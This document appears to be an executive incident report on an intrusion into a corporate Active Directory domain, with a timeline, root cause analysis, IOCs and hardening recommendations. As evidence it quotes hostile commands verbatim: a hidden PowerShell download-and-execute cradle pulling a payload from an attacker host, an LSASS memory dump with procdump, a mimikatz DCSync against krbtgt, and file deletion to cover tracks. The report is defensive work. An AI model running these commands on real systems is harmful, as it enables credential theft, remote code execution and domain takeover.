# Executive Incident Report: Operation Silent Cascade

**Incident ID:** INC-2024-07182
**Classification:** APT / Business Email Compromise → Data Exfiltration
**Severity:** CRITICAL
**Date Range:** September 16 – September 19, 2024
**Environment:** corp.local (Active Directory — 3 Servers, ~150 Workstations)
**Threat Actor:** APT-SILENT-47 (Financially Motivated)

---

## Executive Summary

A financially motivated threat actor compromised the enterprise via a spearphishing email containing a malicious Excel macro attachment delivered to WORKSTATION-01. Execution of the attachment triggered PowerShell-based payload retrieval from `update-service.cloud-cdn.net`, establishing command-and-control communication and enabling system-level execution on the host. The attacker escalated privileges through LSASS credential dumping (`procdump64.exe -ma lsass.exe`) and later performed a DCSync attack against DC-01 to extract the krbtgt account hash, achieving full domain compromise.

Post-compromise activity included lateral movement via SMB to FILESERVER-01, discovery of privileged accounts, scheduled task persistence as SYSTEM on both WORKSTATION-01 and DC-01, and collection of sensitive financial documents (`Client_Portfolio_2024.xlsx`, `M&A_Due_Diligence.docx`). The attacker exfiltrated data using DNS TXT record tunneling to `data.trustedservices.online`, encoding payloads in Base64 chunks and transmitting approximately 1,408 bytes per query. Exfiltration remained undetected for approximately three days due to insufficient DNS anomaly detection controls.

Business impact includes full Active Directory compromise, potential long-term persistence via Golden Ticket forgery (krbtgt hash extraction), exposure of sensitive corporate financial data, and regulatory notification requirements under applicable data breach frameworks.

**Critical Recommendation:** Implement enterprise-wide email security hardening combined with Office macro blocking and Attack Surface Reduction (ASR) rules to eliminate initial execution paths, which was the single most critical failure enabling the entire attack chain.

---

## Root Cause Analysis

### Primary Root Cause: Failure to Block Macro-Based Payload Execution

The initial spearphishing email (`Q3_Financial_Review.xlsm`) was successfully delivered to MAIL-01 and executed on WORKSTATION-01, triggering the entire attack chain. The root cause is attributed to the absence of macro execution controls in the enterprise endpoint configuration:

1. **Email Gateway:** No attachment scanning or sandboxing was in place to detect the malicious `.xlsm` file with embedded macros.
2. **Office Hardening:** Group Policy did not enforce "Block macros from the Internet" or "Disable all macros with notification" settings.
3. **Attack Surface Reduction:** ASR rules to "Block Office from creating child processes" and "Block Win32 API calls from Office macros" were not enabled.
4. **User Privilege:** The affected user possessed permissions allowing the execution of arbitrary PowerShell scripts and binary execution from user-writable directories.

**Evidence:**
- Event 4688: `EXCEL.EXE C:\Users\s.johnson\Downloads\Q3_Financial_Review.xlsm`
- Event 4688 (child process): `powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command IEX(New-Object Net.WebClient).DownloadString('http://update-service.cloud-cdn.net/payload/stage1.ps1')`

### Contributing Factors

| Factor | Details |
|---|---|
| Insufficient DNS Monitoring | No anomaly detection on DNS TXT query volume or entropy; tunneling persisted for ~3 days |
| No LSASS Protection | Credential Guard / RunAsPPL not enabled; LSASS memory was readable by procdump64.exe |
| Weak Lateral Movement Controls | No network segmentation between workstations and domain controllers; SMB access to DC-01 from compromised workstation |
| No Scheduled Task Auditing | Event ID 4698 (Task Created) not monitored or alerted |
| Lack of PowerShell Constrained Language Mode | Full language mode allowed arbitrary script execution and download cradles |

---

## Incident Response Summary

### Phase 1: Initial Compromise (September 16, 09:12 – 10:20 UTC)

- **09:12:33** — Spearphishing email delivered to MAIL-01 (10.10.1.5) from `cfo-quarterly-reports@corp-finance-review.com` with subject "Q3 Financial Review - Action Required"
- **09:15:01** — User on WORKSTATION-01 (10.10.2.100) clicked embedded link
- **10:13:45** — Malicious file executed; EXCEL.ELE opened `Q3_Financial_Review.xlsm` (Event 4688)
- **10:15:22** — Excel spawned PowerShell to download and execute stage1.ps1 from C2 infrastructure
- **10:16:02** — Malicious DLL (`update.dll`) executed via rundll32.exe (T1218.011)
- **10:20:00** — C2 channel established over TCP to 203.0.113.100:8443

### Phase 2: Persistence & Discovery (September 16, 10:30 – 12:22 UTC)

- **10:30:15** — Scheduled task created to execute stage1.ps1 every 15 minutes as SYSTEM (WORKSTATION-01)
- **10:45:10** — Registry Run key persistence established via rundll32.exe
- **11:05:33** — `net view /domain:CORP` — Remote system discovery
- **11:07:15** — `net group "Domain Admins" /domain` — Privileged account discovery
- **12:22:45** — LSASS memory dumped via `procdump64.exe -ma lsass.exe lsass.dmp` (Event ID 4688)

### Phase 3: Lateral Movement & Domain Compromise (September 16, 13:45 – 14:15 UTC)

- **13:45:00** — Lateral movement to DC-01 (10.10.1.10) via SMB admin share using account `a.mitchell` (Event 4624 — Logon Type 3)
- **13:46:15** — `whoami /all` executed on DC-01 (parent process: service.exe)
- **13:48:30** — DCSync attack: `mimikatz.exe lsadump::dcsync /domain:corp.local /user:krbtgt`
- **13:48:31** — Event 4662 detected — DS-Replication-Get-Changes and DS-Replication-Get-Changes-all access granted
- **14:15:22** — Scheduled task `DCSyncJob` created on DC-01 to execute `dc_update.ps1` every 30 minutes as SYSTEM

### Phase 4: Collection & Exfiltration (September 17 – 19, 2024)

- **September 17, 16:30:00** — Lateral movement to FILESERVER-01 (10.10.1.20) via SMB (port 445)
- **September 17, 16:35:22** — Collection of `Client_Portfolio_2024.xlsx` and `M&A_Due_Diligence.docx` from `\\FILESERVER-01\Finance`
- **September 18, 16:22:05** — Secondary C2 established on DC-01 to 203.0.113.50:8443
- **September 18, 16:30:00** — Exfiltration via DNS tunnel to `data.trustedservices.online`; file `output.zip` staged
- **September 19, 04:15:05** — High-volume DNS TXT queries with Base64-chunked subdomains (e.g., `ZmlsZTE`, `cmVwb3J0`); each query ~1,408 bytes
- **September 19, 04:35:15** — Defense evasion: `cmd.exe /c del /q output.zip` and deletion of `mimikatz.exe`
- **September 19, 04:36:12** — Final staging upload to `staging.trustedservices.online` (203.0.113.51)

---

## Remediation Recommendations

### Immediate Containment Actions

1. Isolate all affected hosts (WORKSTATION-01, DC-01, FILESERVER-01, MAIL-01)
2. Disable accounts used by attacker: `s.johnson`, `a.mitchell`
3. Block all IOCs at perimeter firewall and DNS sinkhole:
   - Domains: `corp-finance-review.com`, `update-service.cloud-cdn.net`, `data.trustedservices.online`, `staging.trustedservices.online`
   - IPs: 198.51.100.77, 203.0.113.50, 203.0.113.100, 203.0.113.51
4. Remove scheduled tasks: `DCSyncJob` (DC-01), stage1.ps1 task (WORKSTATION-01)
5. Remove Registry Run key persistence from WORKSTATION-01

### krbtgt Reset Procedure (Critical)

1. Reset krbtgt password **twice** with a 48-hour gap between resets
2. Validate replication integrity before and after each reset
3. Monitor for Golden Ticket usage post-reset (Event ID 4624 anomalies)

### Full Domain Remediation

1. Reset all Tier-0 privileged account passwords (Domain Admins, Enterprise Admins)
2. Reset all service account credentials
3. Audit and rebuild-affected DCs from known-good backup or redeploy
4. Validate trust relationships and replication integrity

### Group Policy Object (GPO) Recommendations

#### 1. Disable Office Macros

| Setting | Configuration |
|---|---|
| GPO Path | `User Configuration → Administrative Templates → Microsoft Office → Macro Settings` |
| Policy | "Disable all macros with notification" OR "Block macros from the Internet" |

#### 2. Attack Surface Reduction (ASR) Rules

| ASR Rule | GUID |
|---|---|
| Block Office from creating child processes | `d4f940ab-401b-4efc-aadc-ad5f3c50688a` |
| Block Win32 API calls from Office macros | `92e97fa1-2edf-4476-bdd6-9dd0b4dddc7b` |
| Block executable content from email/webmail | `01443614-cd74-433a-b99e-2ecdc07bfc25` |

#### 3. Restrict Scheduled Task Creation

- Limit scheduled task creation to Administrators only via GPO security policies
- Enable auditing for Event ID 4698 (Scheduled Task Created) across all domain-joined systems

#### 4. PowerShell Hardening

| Setting | Configuration |
|---|---|
| Execution Policy | Set to `Restricted` or `RemoteSigned` via GPO |
| Language Mode | Enable Constrained Language Mode |
| Script Block Logging | Enable (Event ID 4104) |
| AMSI Integration | Enable for all Office applications |

#### 5. Privilege & Endpoint Hardening

- Enable Windows Defender Credential Guard (RunAsPPL) on all domain-joined workstations
- Restrict standard users from executing `rundll32.exe` from user-writable paths
- Restrict standard users from creating Registry Run keys
- Implement network segmentation isolating workstations from domain controllers
- Enable DNS firewall / sinkhole for known-bad domains

---

## Blast Radius Assessment

Assuming the krbtgt account hash was successfully extracted via DCSync:

| Impact Category | Description |
|---|---|
| Kerberos TGT Forgery | Attacker can forge Ticket Granting Tickets using stolen krbtgt hash |
| Golden Ticket Attacks | Persistent domain-level authentication bypass | 
| Unlimited Lateral Movement | Attacker can impersonate any domain user including Domain Admins |
| Persistent Access | krbtgt password resets require two cycles; attacker retains access until both resets complete |
| Data Exposure | Client portfolio and M&A due diligence documents exfiltrated; potential regulatory penalties |

### Minimum Recovery Scope

1. Reset krbtgt password twice (48-hour gap between resets)
2. Reset all Domain Admin, Enterprise Admin, and privileged service account passwords
3. Rebuild domain controllers from known-good state
4. Reset Kerberos trust relationships
5. Audit all domain-joined systems for persistence artifacts
6. Implement GPO changes enumerated above before returning systems to production
